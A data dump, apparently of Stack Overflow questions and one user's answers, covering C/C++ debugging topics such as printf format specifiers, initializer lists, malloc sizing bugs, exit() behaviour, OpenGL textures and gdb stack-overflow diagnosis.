<p>I want to write tight code and avoid unnecessary function calls, I would care about this in Java, because, well, we all know why. But, I want my code to be readable and to use the <code>private</code> and <code>public</code> keywords to correctly reflect what is to be done. </p>
","9530","","<p>Any compiler worth its salt will easily optimize the getters into direct member access.  The only times that won't happen are when you have optimization explicitly disabled (e.g. for a debug build) or if you're using a brain-dead compiler (in which case, you should seriously consider ditching it for a real compiler).</p>
"
"<p>In my class work, I've done this successfully, but only in very simple programs. Today, I had a more complex program, and Eclipse did horrible borky things after I defined DEBUG as a symbol, and these horrible things did not go away after I removed the definition. I've been told by another source that the symbol DEBUG is in used by the gcc compiler, and that I am interfering with a standard library by defining it myself.</p>

<p>Is it okay to use #define DEBUG myself? Or not?</p>
","9530","","<p>Yes, it is perfectly ok to define the symbol <code>DEBUG</code> yourself.  But it is <strong>not</strong> ok to define the symbol <code>_DEBUG</code> (note the leading underscore): symbols beginning with an underscore and a capital letter, or two underscores, are reserved for use by the implementation (that is, the compiler and toolchain).  Since they are reserved, you should not define them yourself, but you can certainly test their existence.  See §7.1.3 of the C99 standard.</p>

<p>Another symbol to be aware of is <code>NDEBUG</code>, which you are free to define or not to define, but if you do define it before the inclusion of <code>&lt;assert.h&gt;</code>, it causes all <code>assert</code> statements to be removed.</p>
"
"<p>I want to immediately exit my MFC app in C++. Is exit(0) the best solution? eg. does it prevent destructors from being called, is it threadsafe? etc. Is there a better solution? Thanks.</p>
","9530","","<p>Yes, <code>exit(0)</code> is the best solution.  It will cause the destructors of global objects (and <code>static</code> objects within functions) to run, however it will not cause destructors of stack-allocated or heap-allocated objects to run:</p>

<pre><code>// At global scope
ClassWithDestruct globalObject;

void SomeFunction()
{
    static ClassWithDestructor staticObject;
    ClassWithDestructor stackObject;
    ClassWithDestructor *heapObject = new ClassWithDestructor;

    // On the following call to exit(), the destructors of 'globalObject' and
    // 'staticObject' will run, but those of 'stackObject' and 'heapObject' will
    // NOT run
    exit(0);
}
</code></pre>

<p>As to whether or not it's thread-safe, that's a hard question to answer: you should not be calling <code>exit</code> simultaneously from multiple threads, you should only call it once.  If any destructors run as a result of <code>exit</code>, or any if any functions registered with <a href=""http://linux.die.net/man/3/atexit"" rel=""nofollow""><code>atexit</code></a> run, then obviously those functions should be thread-safe if they deal with data that could potentially be being used by other threads.</p>

<p>If your program is exiting normally (say, as a result of the user requesting an exit), you should either call <code>exit</code> or return from <code>main</code>/<code>WinMain</code>, which is equivalent to calling <code>exit</code>.  If your program is exiting <strong>abnormally</strong> (say, as a result of an access violation or failed assertion), you should call either <code>_exit</code> or <code>abort</code>, which <strong>do not</strong> call any destructors.</p>
"
"<p>I am trying to parse a given textfile, but so far, my program does not seem to be reading properly.</p>

<pre><code>#include &lt;stdio.h&gt;


int main(int argc, char *argv[])
{
    FILE *fr; //file pointer
    int buildingFloors = 1;

    printf(""sanity check\n"");  

    fr = fopen (argv[0], ""r"");
    fscanf(fr, ""%d"", &amp;buildingFloors );

    printf(""%d\n"", buildingFloors);

    fclose(fr);

    return 0;
}
</code></pre>

<p>I compile the program and run it on my redhat linux machine with the following command:</p>

<pre><code>./sjf file.text
</code></pre>

<p>file.text is a text document with a ""4"" as the first character. So I would expect my output to be</p>

<pre><code>sanity check
4
</code></pre>

<p>However, when I run my program I instead get</p>

<pre><code>sanity check
1
</code></pre>

<p>Which implies that fscanf didn't properly read in the first character -- 4. Do I have some syntax error that's preventing the expected code functionality? Am I supposed to scanf for a character, and then convert that to an int somehow?</p>
","9530","","<p><code>argv[0]</code> is the name of the program (<code>./sjf</code> in your case), so you're trying to read in your own program's executable.  Use <code>argv[1]</code> instead to get the first real program argument.</p>
"
"<p>this is an integer array:</p>

<pre><code>int values[] = { 75, '*', 5,'-' };

for(i=0 ; i&lt;size ; i++){
    // Here
}
</code></pre>

<p>how to check if the <strong><em><code>values[i]</code></em></strong> is an integer or an operation ??</p>

<p>maybe the value equals the Ascii of an operation,, how to deal with it in this case??</p>
","9530","","<p>You can't.  As for as the compiler is concerned, the constants <code>42</code> an <code>'*'</code> are one and the same.  In the compiled object code, they're both represented as the integer 42.</p>

<p>If you need to differentiate between integers and characters, either use a boolean flag or enum indicating the type of the value, or keep your integers and characters in separate arrays.</p>

<p>Note that in C++, but <em>not</em> in C, there is a slight difference: <code>42</code> has the type <code>int</code>, whereas <code>'*'</code> has the type <code>char</code>, so you can differentiate this fact using overloaded functions or templates.</p>
"
"<p>I have a project which compiles in multiple platforms...  Windows, Unix, Linux, SCO, name your flavor.</p>

<p>I would like to stuff the output target's name into a variable in the project source code (the name of the output program, DLL, SO library or whatever) so I can use it in messages as a generic way to reference the component name be it an EXE on Windows, a DLL, an SO library on Unix, etc.</p>

<p>What I'm thinking of is a preprocessor key like <em>FUNCTION</em>_ but something to pull the name of the EXE/DLL on Windows in Visual C++, and then secondarily the SO output library in GCC.  Those are probably going to be two different mechanisms of course, but I figure to coalesce the two into one option that I can use generically in my multiplatform code.</p>

<p>So a macro'ish thing or something I can call which at least picks up the Windows output file name during compilation (Visual C++) so I can push it into a const string in the code, and maybe a way to do the same thing in GCC so the two platforms can be wrapped into an single abstraction.  Preferably not picked up at runtime but caught and persisted during compilation.</p>

<p>If the output is a library, then its the lib file name.  If it's a component, then the output component file name.</p>

<p>I expect Boost or Poco must have something like this already possibly with some unsupported endpoints which is fine.</p>
","9530","","<p>If everything is together under one project, you can use a preprocessor macro.  To do this in Visual Studio, open up your project properties and go to Configuration Properties > C/C++ > Preprocessor, and add something like <code>PROGRAM_NAME=""\""$(ProjectName)\""""</code> to the Preprocessor Defines field (which corresponds to the <code>/Dfoo=bar</code> compiler option).</p>

<p>For GCC, use the similar <code>-Dfoo=bar</code> command line option.  For example, your Makefile might look something like this:</p>

<pre><code>PROGRAM_NAME = myapplication
CFLAGS += '-DEXECUTABLE_NAME=""$(PROGRAM_NAME)""'

# Rule to make the executable from the object files
$(PROGRAM_NAME): $(OBJS)
    $(LD) $(OBJS) -o $@ $(LDFLAGS)

# Rule to make object files from C source files
%.o: %.c
    $(CC) $(CFLAGS) -c $&lt; -o $@
</code></pre>

<p>This allows your source files to use the macro <code>PROGRAM_NAME</code>, which will expand to the constant string <code>""myapplication""</code> in this case.</p>

<p>However, if you have object files that are being linked into multiple programs (e.g. you have lots of shared library code which can be run either by the main program driver or by various test suites), then the object files can't know which executable they're being linked into ahead of time, so they have to determine that at runtime.</p>

<p>In that case, use a constant global variable to store the program name, and define and initialize that in each executable's main source file using the technique above.</p>
"
"<p>With respect to the class definition for complex number, I saw two types of definitions:</p>

<p>Definition 1</p>

<pre><code>class Complex
{
   private:
      double re;
      double im;

   public:
      Complex(float r,float i) {re = r; im = i;}
      ~Complex() {};
};
</code></pre>

<p>Definition 2</p>

<pre><code>class Complex
{
   private:
      double re;
      double im;

   public:
      Complex(double r,double i): re(r), im(i) {}
      ~Complex() {};
 };
</code></pre>

<p>The first definition looks OK to me but I do not quite understand the second definition, how does </p>

<pre><code> Complex(double r,double i): re(r), im(i) {}
</code></pre>

<p>work? What does ""re( )"" mean? </p>
","9530","","<p>It's called an <strong>initializer list</strong>.  In a class's constructor, you can initialize member variables with this syntax.  So in this, it's equivalent to putting the statements <code>re = r; im = i;</code> in the body of the constructor.</p>

<p>In the case of POD variables such as <code>int</code>, <code>double</code>, and pointer types, there is no difference between the initializer list syntax and regular assignments in the body.  However, for <code>const</code> variables, references, and objects with non-trivial constructors, <strong>there is an important difference</strong>:</p>

<ul>
<li>For <code>const</code> variables and reference variables, they <em>must</em> be initialized in the initializer list.  They <em>cannot</em> be initialized by assigning to them in the body.</li>
<li>For objects with non-trivial constructors, how you initialize them in the initializer list corresponds to the constructor that gets called.  If you omit the variable, then that object's default constructor gets called (if that object has no default constructor, then that is a compiler error).</li>
</ul>

<p>Because of that, it's generally recommended that objects with constructors get initialized in the initializer list to avoid redundant work -- if you let its default constructor run by omitting it from the initializer list and then perform some sort of initialization in the constructor body, you're initializing it twice, which can be wasteful.</p>

<p>For example:</p>

<pre><code>class Example
{
private:
    std::string m_string;
public:
    Example()
    {
        // m_string is first initialized by the std::string default constructor,
        // then we assign to it with operator=(const char *).
        // This is inefficient.
        m_string = ""test"";
    }

    Example(int dummy)
        : m_string(""test"")
    {
        // Better: we just call the std::string(const char*) constructor directly
    }
};
</code></pre>
"
"<p>Python has <code>string.startswith()</code> and <code>string.endswith()</code> functions which are pretty useful.
What NSString methods can I use to have the same function?</p>
","9530","","<p>Use <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html#//apple_ref/occ/instm/NSString/hasPrefix%3a""><code>-hasPrefix:</code></a> and <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html#//apple_ref/occ/instm/NSString/hasSuffix%3a""><code>-hasSuffix:</code></a>:</p>

<pre><code>NSString *s = @""foobar"";
NSLog(@""%d %d\n"", [s hasPrefix:@""foo""], [s hasSuffix:@""bar""]);
// Output: ""1 1""
</code></pre>
"
"<p>I reading a C book. To print out a memory address of a variable, sometimes the book uses:</p>

<pre><code>printf(""%u\n"",&amp;n);
</code></pre>

<p>Sometimes, the author wrote:</p>

<pre><code>printf(""%d\n"",&amp;n);
</code></pre>

<p>The result is always the same, but I do not understand the differences between the two (I know %u for unsigned).</p>

<p>Can anyone elaborate on this, please?</p>

<p>Thanks a lot.</p>
","9530","","<p><code>%u</code> treats the integer as unsigned, whereas <code>%d</code> treats the integer as signed.  If the integer is between 0 an <code>INT_MAX</code> (which is 2<sup>31</sup>-1 on 32-bit systems), then the output is identical for both cases.</p>

<p>It only makes a difference if the integer is negative (for signed inputs) or between <code>INT_MAX+1</code> and <code>UINT_MAX</code> (e.g. between 2<sup>31</sup> and 2<sup>32</sup>-1).  In that case, if you use the <code>%d</code> specifier, you'll get a negative number, whereas if you use <code>%u</code>, you'll get a large positive number.</p>

<p>Addresses only make sense as unsigned numbers, so there's never any reason to print them out as signed numbers.  Furthermore, when they are printed out, they're usually printed in hexadecimal (with the <code>%x</code> format specifier), not decimal.</p>

<p>You should really just use the <code>%p</code> format specifier for addresses, though—it's guaranteed to work for all valid pointers.  If you're on a system with 32-bit integers but 64-bit pointers, if you attempt to print a pointer with any of <code>%d</code>, <code>%u</code>, or <code>%x</code> without the <code>ll</code> length modifier, you'll get the wrong result for that and anything else that gets printed later (because <code>printf</code> only read 4 of the 8 bytes of the pointer argument); if you do add the <code>ll</code> length modifier, then you won't be portable to 32-bit systems.</p>

<p>Bottom line: always use <code>%p</code> for printing out pointers/addresses:</p>

<pre><code>printf(""The address of n is: %p\n"", &amp;n);
// Output (32-bit system): ""The address of n is: 0xbffff9ec""
// Output (64-bit system): ""The address of n is: 0x7fff5fbff96c""
</code></pre>

<p>The exact output format is implementation-defined (C99 §7.19.6.1/8), but it will almost always be printed as an unsigned hexadecimal number, usually with a leading <code>0x</code>.</p>
"
"<p>Here is my code. I'm attempting to draw a simple quadrilateral, and place a checkerboard pattern on both sides of it. I want to allow the user to rotate around this piece with the mouse. Everything works fine, other than the texture - it is slanted, and only covers about half of the quad. Can anyone see something glaringly obvious that I am doing wrong? Thanks.</p>

<pre><code>#include ""glut-3.7.6-bin\glut.h""

// Constants for rotating camera
#define CAMERA_RELEASE 0
#define CAMERA_ROTATE 1
#define CAMERA_ZOOM 2

// Current camera control setting
int cameraSetting;

// Current viewing angle and scale of the scene
float viewAngleX, viewAngleY, scaleFactor = 1.0;

// Click coordinates
int clickX, clickY;

// Screen size
const int screenWidth = 600;
const int screenHeight = 600;

// Texture data
GLuint texture;

////////////////////////////////////////////////////////////////
//      Function Prototypes
////////////////////////////////////////////////////////////////

GLuint loadTexture(const char * filename);

////////////////////////////////////////////////////////////////
//      Callback and Initialization Functions
////////////////////////////////////////////////////////////////

void callbackMouse(int button, int state, int x, int y)
{
    if (state == GLUT_DOWN)
    {
        // Store clicked coordinates
        clickX = x;
        clickY = y;

        // Set camera mode to rotate
        if (button == GLUT_LEFT_BUTTON)
        {
            cameraSetting = CAMERA_ROTATE;
        } 
        // Set camera mode to zoom
        else if (button == GLUT_RIGHT_BUTTON) 
        {
            cameraSetting = CAMERA_ZOOM;
        }
    }
    // Ignore camera commands if no button is clicked
    else if (state == GLUT_UP)
    {
        cameraSetting = CAMERA_RELEASE;
    }
}

void callbackKeyboard(unsigned char key, int x, int y)
{
    if (key == 'q') {
        exit(0);
    }

}

void callbackMotion(int x, int y)
{
    if (cameraSetting == CAMERA_ROTATE)
    {
        // Camera rotate setting - adjust the viewing angle by the direction of motion
        viewAngleX += (x - clickX) / 5.0;
        viewAngleX = viewAngleX &gt; 180 ? (viewAngleX - 360) : (viewAngleX &lt; - 180 ? (viewAngleX + 360) : viewAngleX);
        clickX = x;

        viewAngleY += (y - clickY) / 5.0;
        viewAngleY = viewAngleY &gt; 180 ? (viewAngleY - 360) : (viewAngleY &lt; - 180 ? (viewAngleY + 360) : viewAngleY);
        clickY = y;
    }
    else if (cameraSetting == CAMERA_ZOOM)
    {
        // Polygonal scale to simulate camera zoom
        float currentScaleFactor = scaleFactor;

        scaleFactor *= (1+ (y - clickY) / 60.0);

        scaleFactor = scaleFactor &lt; 0 ? currentScaleFactor : scaleFactor;

        clickY = y;
    }

    glutPostRedisplay();
}

void callbackDisplay()
{
    // Clear the screen
    glEnable(GL_DEPTH_TEST);
    glClearColor(0, 0, 0, 0);
    glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);

    // Set world window
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluPerspective(60, 1, 1, 100);

    // Setup 3D environment
    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();

    gluLookAt(0,0,5,
            0,0,0,
            0,1,0);

    // Rotate and scale 3D environment to current user settings
    glRotatef(viewAngleX, 0, 1, 0);
    glRotatef(viewAngleY, 1, 0, 0);
    glScalef(scaleFactor, scaleFactor, scaleFactor);

    glBegin(GL_QUADS);
        glTexCoord2d(0.0, 0.0); glVertex3f(-30, -5, -30);
        glTexCoord2d(1.0, 0.0); glVertex3f(30, -5, -30);
        glTexCoord2d(1.0, 1.0); glVertex3f(30, -5, 30);
        glTexCoord2d(0.0, 1.0); glVertex3f(-30, -5, 30);
    glEnd();

    // Swap frame buffers
    glutSwapBuffers();
}

void windowInitialization() {

    // Enable textures by default
    glEnable(GL_TEXTURE_2D);

    // Load texture
    texture = loadTexture(""checkerboard.raw"");

    glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);

}

////////////////////////////////////////////////////////////////
//      Main
////////////////////////////////////////////////////////////////

int main(int argc, char** argv)
{   
    // GLUT Initialization
    glutInit(&amp;argc, argv); 
    glutInitDisplayMode(GLUT_RGB|GLUT_DOUBLE|GLUT_DEPTH); 
    glutInitWindowSize(screenWidth,screenHeight); 

    // Create main window
    glutCreateWindow(""Test""); 
    windowInitialization();

    // Register callback functions
    glutDisplayFunc(callbackDisplay); 
    glutMouseFunc(callbackMouse); 
    glutMotionFunc(callbackMotion);
    glutKeyboardFunc(callbackKeyboard); 

    // Enter event processing loop
    glutMainLoop(); 

}

////////////////////////////////////////////////////////////////
//      Prototyped Functions
////////////////////////////////////////////////////////////////

GLuint loadTexture(const char * filename)
{
    GLuint texture;
    int width, height;
    BYTE * data;
    FILE * file;

    // open texture data
    file = fopen( filename, ""rb"" );
    if ( file == NULL ) return 0;

    // allocate buffer
    width = 256;
    height = 256;
    data = (BYTE *) malloc( width * height * 3 );

    // read texture data
    fread( data, width * height * 3, 1, file );
    fclose( file );

    glGenTextures( 1, &amp;texture );
    glBindTexture( GL_TEXTURE_2D, texture );

    glTexEnvf( GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_MODULATE );

    glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_NEAREST );
    glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );

    // texture wraps over at the edges
    glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, 1 );
    glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, 1);

    // build texture
    gluBuild2DMipmaps( GL_TEXTURE_2D, 3, width, height,
                       GL_RGB, GL_UNSIGNED_BYTE, data );

    // free buffer
    free( data );

    return texture;
}
</code></pre>

<p><img src=""http://i.stack.imgur.com/RARS0.png"" alt=""half-covered,distorted""></p>
","9530","","<p>Your code works fine for me; I suspect the problem is in the source image you're using for the texture.  Double-check that the image is what you think it is.  For example, using <a href=""http://www.imagemagick.org/script/index.php"" rel=""nofollow"">ImageMagick</a>:</p>

<pre><code># Convert an image into raw RGB:
convert checkerboard.png checkerboard.rgb
# Convert raw RGB back to an image (assuming we know the size and color depth):
convert -size 256x256 -depth 8 checkerboard.rgb checkerboard.png
</code></pre>
"
"<p>I am learning C and I have the following code:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;

int main(int argc, char *argv[])
{
  double x;
  printf(""x = "");
  scanf(""%ld"", &amp;x);
  printf(""x = %lf\n"", x);

  system(""PAUSE"");  
  return 0;
}
</code></pre>

<p>(I am using Dev C4.9, Windows XP SP3)</p>

<p>When I run the above program and entered 5.3; the program printed <code>x = 0.000000</code></p>

<p>Can anyone explain why is that, please?</p>

<p>Thanks a lot.</p>
","9530","","<p>The <code>%ld</code> format string means that it's expecting to read in a <code>long signed int</code>, but you're passing it instead a <code>double</code>.  You should instead use the <code>%lf</code> format specifier to say that you want a <code>double</code>.</p>

<p>Note that for <code>scanf</code>, the <code>l</code> is required for <code>double</code>s (and is required to be absent for <code>float</code>s), whereas for <code>printf</code>, the <code>l</code> in <code>%lf</code> has no effect: both <code>%f</code> and <code>%lf</code> have the same output for both <code>float</code>s and <code>double</code>s, due to default argument promotion.</p>
"
"<p>I am using Facebook SDK(Codeplex) on Windows Phone 7.</p>

<p>When I try to write on Friends Wall, I get this exception raised ((OAuthException) (#210) User not visible)</p>

<p>Below is my query</p>

<pre><code>private string requestedFbPermissions = ""user_about_me,publish_stream"";
//
var parms = new Dictionary&lt;String, object&gt;();
parms[""display""] = ""touch"";
parms[""client_id""] = apiKey;
parms[""scope""] = requestedFbPermissions;
parms[""type""] = ""user_agent"";

try
{
    string feedRequest = selectedUID + ""/feed?message=\'Test Msg\'"";

    fbApp.PostAsync(feedRequest, parms, (value) =&gt;
    {
        object result = value.Result;
        JObject stuff = JObject.Parse(value.Result.ToString());
    }
}
</code></pre>

<p>Am i missing something , for some friends i am able to write on wall successfully. </p>
","9530","","<p>You're probably using the wrong user ID of the friend -- if you try to post to the wall of someone with whom you're not friends, the API will return error #201 ""User not visible"".  Double-check that you're using the correct user ID, and that you're friends with that user.</p>
"
"<p>I've two different template classes. One of them has a member function that returns a pointer to an object of the other template class. 
Currently, I'm not able to compile the code below and any suggestions are really welcome.</p>

<h3>main.cpp</h3>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;foo.h&gt;
#include &lt;bar.h&gt;

int main(int argc, char **argv){
    ...
    int nParam;
    ...

    CFoo&lt;float&gt; * pFoo = NULL;
    pFoo = new CFoo&lt;float&gt;();

    CBar&lt;float&gt; * pBar = NULL;
    pBar = pFoo-&gt;doSomething(nParam); // error: no matching function for call to ‘CFoo&lt;float&gt;::doSomething(int)’

    ...

    delete pFoo;
    delete pBar;

    return (0);
}
</code></pre>

<h3>foo.h</h3>

<pre><code>#include &lt;bar.h&gt;

template &lt; class FOO_TYPE &gt;
class CFoo{

    public:

        ...

        template &lt; class BAR_TYPE &gt;
        CBar&lt;BAR_TYPE&gt; * doSomething(int);
        ...
};
</code></pre>

<h3>foo.cpp</h3>

<pre><code>template &lt; class FOO_TYPE &gt;
template &lt; class BAR_TYPE &gt;
CBar&lt;BAR_TYPE&gt; * CFoo&lt;FOO_TYPE&gt;::doSomething(int nParam){
    ...
}
#include ""foo-impl.inc"" 
</code></pre>

<h3>foo-impl.inc</h3>

<pre><code>template class CFoo&lt;float&gt;;
template class CFoo&lt;double&gt;;

template CBar&lt;float&gt;* CFoo&lt;float&gt;::doSomething( int );
template CBar&lt;double&gt;* CFoo&lt;float&gt;::doSomething( int );
template CBar&lt;double&gt;* CFoo&lt;double&gt;::doSomething( int );
template CBar&lt;float&gt;* CFoo&lt;double&gt;::doSomething( int );

/*
I also tried the explicit instantiation in the last line, but I get the error below:
template-id ‘doSomething&lt;CBar&lt;float&gt;*&gt;’ for ‘CBar&lt;float&gt;* CFoo&lt;float&gt;::doSomething(int)’ does not match any template declaration
*/
// template CBar&lt;float&gt;* CFoo&lt;float&gt;::doSomething &lt; CBar&lt;float&gt; * &gt; ( int ); 
</code></pre>

<p>Consider that I need to call the <code>doSomething</code> method inside of a <code>member function</code> of a third class.</p>

<h3>myclass.cpp</h3>

<pre><code>template &lt; class FOO_TYPE, class BAR_TYPE &gt;
void CMyClass&lt;FOO_TYPE, class BAR_TYPE&gt;::doSomeWork(CFoo&lt;FOO_TYPE&gt; * pFoo){
    ...
    int nParam;
    ...
    CBar&lt;BAR_TYPE&gt; * pBar = NULL;
    pBar = pFoo-&gt;doSomething&lt;BAR_TYPE&gt;(nParam); //error: expected primary-expression before ‘&gt;’ token

    delete pBar;
    ...
} 
</code></pre>

<p>Note that, I had <a href=""http://stackoverflow.com/questions/4217216/returning-template-types-from-non-template-parameterized-methods"">a similar problem that I posted a while ago in this forum</a>, but by trying to adapt the suggestion to my code, I couldn't solve the bug. I hope, my post is valid.</p>
","9530","","<p>The compiler can't deduce the template arguments -- it doesn't know whether you want to call <code>CFoo&lt;float&gt;::doSomething&lt;float&gt;(int)</code>, <code>CFoo&lt;float&gt;::doSomething&lt;unsigned int&gt;(int)</code>, or whatever.  So, you have to explicitly tell it what the template arguments are:</p>

<pre><code>// Explicitly call the function with BAR_TYPE=float
pBar = pFoo-&gt;doSomething&lt;float&gt;(1);
</code></pre>
"
"<p>I have the following code:</p>

<pre><code>struct VRfile{    
    char sessionID[10];    
    char file[20];    
    int first;    
};    

std::map (int ,struct VRfile *) maps;
struct VRfile *vrinfo = (struct VRfile*)malloc (sizeof(struct VRfile*));
 strcpy(vrinfo-&gt;sessionID, sessionId.c_str());  
  strcpy(vrinfo-&gt;file, filename.c_str());  

 socketmap.insert(std::pair(int , struct VRfile *) (thisfd,vrinfo));
</code></pre>

<p>I'm getting an error at the <code>socketmap.insert(std::pair(int , struct VRfile *) (thisfd,vrinfo));</code> line:    </p>

<pre><code>Error: *** glibc detected *** memory corruption: 0x080aa7b0 ***  
/lib/libc.so.6[0x6222dd]  
/lib/libc.so.6(__libc_malloc+0x67)[0x623e97]  
/usr/lib/libstdc++.so.6(_Znwj+0x27)[0x45d7ab7]  

backtrace:  
0  0x002eb402 in __kernel_vsyscall ()  
1  0x005e0df0 in raise () from /lib/libc.so.6  
2  0x005e2701 in abort () from /lib/libc.so.6  
3  0x0061928b in __libc_message () from /lib/libc.so.6  
4  0x006222dd in _int_malloc () from /lib/libc.so.6  
5  0x00623e97 in malloc () from /lib/libc.so.6  
6  0x045d7ab7 in operator new(unsigned int) () from /usr/lib/libstdc++.so.6  
</code></pre>

<p>Then it points to the line of code I have mentioned above. Can nyone tell me why this is happening?</p>
","9530","","<p>You're not allocating enough space for your structure—you're only allocating a pointer's worth (4 or 8 bytes, depending on your pointer size), when in fact you should be allocating somewhere on the order of 36 bytes (specifically, <code>sizeof(VRfile)</code>.  So, you're stomping on the heap by writing random values into it (a so-called <em>heap overrun</em>), which is messing up the data structures used by <code>malloc</code> to track memory.  When it detects this corruption, it throws its hands up and terminates your program.</p>

<p>However, since this is C++ and not C, you should really be using <code>operator new</code> instead of <code>malloc</code> to allocate dynamic memory.  You don't have to deal with the size of the memory you're allocating, it's implicit in the variable type.  Secondly, there's no reason to always say <code>struct VRfile</code> instead of just <code>VRfile</code>—that's only needed in plain C code (not C++), and only when there isn't a proper <code>typedef</code> (which there usually is).</p>

<p>So, just write this:</p>

<pre><code>VRfile *vrinfo = new VRfile;
</code></pre>

<p>And of course, when you delete your map (or remove any element from it, for that matter), make sure to delete each value in it to avoid leaking memory.  For example:</p>

<pre><code>// This could also be implemented using a functor and std::for_each
for(std::map&lt;int, VRfile*&gt;::iterator iter = maps.begin(); iter != maps.end(); ++iter)
    delete iter-&gt;second;
maps.clear();
</code></pre>
"
"<p>I am currently experiencing issues with a Raytracer ""Engine"" in some calculations.</p>

<pre><code>  info-&gt;eyex = -1000.0;
  info-&gt;eyey = 0.0;
  printf(""%f et %f et %f et %f et %f\n"", info-&gt;eyex, info-&gt;vx, info-&gt;eyey, info-&gt;vy, info-&gt;vz);
</code></pre>

<p>For example, in that piece of code, values seems good, but <code>info-&gt;eyex</code> gives me a <code>-nan</code> error.</p>

<p>It's weird, because I reset the value before.</p>
","9530","","<p>My psychic sense tells me that <code>eyex</code> is declared as an <code>int</code>, not as a <code>double</code> as it should be.  When you assign -1000.0 to it, it gets truncated to the integer -1000 (your compiler <em>should</em> give you a warning here), which is represented in binary as 0xFFFFFC18 using two's complement notation.  Likewise, assuming that <code>eye</code> is also an integer, its value of 0 is represented in binary as 0x00000000.</p>

<p>When you pass <code>eyex</code>, <code>eyey</code>, and the other parameters to <code>printf</code>, they get pushed on the stack so that they lie in memory with increasing addresses.  So immediately before the <code>call</code> instruction to call the subroutine, the stack frame looks something like this:</p>

<pre><code>&lt;top of stack&gt;
0xFFFFFC18   ; eyex
(4-8 bytes)  ; vx
0x00000000   ; eyey
(4-8 bytes)  ; vy
(4-8 bytes)  ; vz
</code></pre>

<p>When <code>printf</code> sees the <code>%f</code> format specifier, that says ""take 8 bytes off of the stack, interpret them as a <code>double</code> value, and print out that <code>double</code> value"".  So it sees the value 0xFFFFFC18xxxxxxxx, where the xxxxxxxxx is the value of <code>info-&gt;vx</code>.  Regardless of that value, this is the <a href=""http://en.wikipedia.org/wiki/IEEE_754-1985"" rel=""nofollow"">IEEE 754</a> representation of NaN, or ""not a number"".  It has the sign bit set, so some implementations may choose to interpret this as ""negative NaN"", though this has the same semantics as regular NaN.</p>

<p>Your compiler should also be warning you here that you're passing the wrong types of arguments to <code>printf</code>—it's expecting a <code>double</code> but you're not passing it that.  GCC enables these warnings with <code>-Wall</code>, which I highly recommend enabling.</p>

<p>So, the solution is to declare <code>eyex</code> to be of type <code>double</code> (and presumably the other variables to also be <code>double</code>, if they're not already).  Alternatively, if you don't control the definition of <code>eyex</code> et al (say, because they're part of a structure for a third-party library), then what you should instead be doing is printing them out with the <code>%d</code> modifier to print them as integers, not with <code>%f</code>, and you should also assign them integer values such as -1000 and 0, not floating-point values such as -1000.0 and 0.0.</p>
"
"<p><strong>Edit:</strong> The first commenter reports that the code has no apparent errors, so I've revised the post with more code.  Apologies for the length.  Again the error appears to be when I reference the string vars in the substructure... note that if I remove the first write that causes the segfault in segfaults later on due to a write to the other string var.  Note that in this scenario other elements of the substructure (e.g. the <code>double Volume</code>) are correctly written without runtime error.</p>

<p><strong>Edit 2:</strong>
As per Dave's suggestion, I ran Valgrind on the debugging enabled executable.  What it spit out was :</p>

<p><strong>Edit 3:</strong> 
Apparently I had a version that malloc instead of a direct array inside the initializer.  Removing this fixed the problem.  I'll give Dave full credit for this one as valgrind is helping me fix all sorts of other memleaks/issues!  Thank you for your help, though....</p>

<p>Line 36 is the one it fails on (commented below)</p>

<p><i>--code removed to prevent dissemination</i></p>

<p>I declare an instance of my top level struct (sim_t) in main.  The program segfaults as soon as I try to write to the strings inside the substructure.  Writes to other vars of the substructure e.g. doubles, ints, etc. appeared to correctly execute when I ran the program in GDB.</p>

<p>It seems like there's something obvious I'm missing here.  Does anyone see the problem with this code?</p>

<p>(And for the record, please don't make comments about the capitalization, I'm following MSDN's naming convention standard.)</p>
","9530","","<p>I'm guessing you're overflowing the stack.  If both <code>NUMBEROFBOXES</code> and <code>sizeof(box_t)</code> are somewhat large, then <code>sizeof(sim_t)</code> is going to be very large, and then even a single instance of <code>sim_t</code> will overflow your stack.</p>

<p>If you can't reduce <code>sizeof(sim_t)</code> in any way, then you'll need to allocate your object on either the heap (e.g. with <code>new</code>) or in static storage (e.g. as a global variable).</p>

<hr>

<p><strong>EDIT</strong></p>

<p>I still suspect a stack overflow, but it's still hard to say at this point.  Run your program under GDB and run these commands and tell us what the results are:</p>

<pre><code>$ gdb myprogram
(gdb) run
...
Program received signal SIGSEGV, Segmentation fault.
(gdb) bt
...
(gdb) list
...
(gdb) disas
...
(gdb) info reg
...
(gdb) info inferior
...
</code></pre>

<p>The last command gives you the PID of the program.  Then, from another terminal, run this command:</p>

<pre><code># Replace PID here with the PID of the program being debugged above
$ cat /proc/PID/maps
</code></pre>

<p>The information from these commands should help determine whether or not the problem is being caused by a stack overflow.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/2221103/how-to-get-process-handle-from-process-id"">how to get process handle from process id?</a>  </p>
</blockquote>



<p>Hello! How i can guaranteed get process handle by process id in windows OS. If exist methods block for my applications opportunity to get process handle by PID. For my application getting Process handle by PID is critical.  If yes what this methods and how i can avoid this methods. Thanks!</p>
","9530","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/ms684320%28v=vs.85%29.aspx"" rel=""nofollow""><code>OpenProcess</code></a>.</p>
"
"<p>Environment: Windows XP SP3, Visual C++ 2010 Express, DLL Template</p>

<p>I am trying to pass command line arguments to my dll function</p>

<p>Example: ""c:\Development>rundll32, getpage.dll,GetPage <a href=""http://www.google.ca"" rel=""nofollow"">http://www.google.ca</a>""</p>

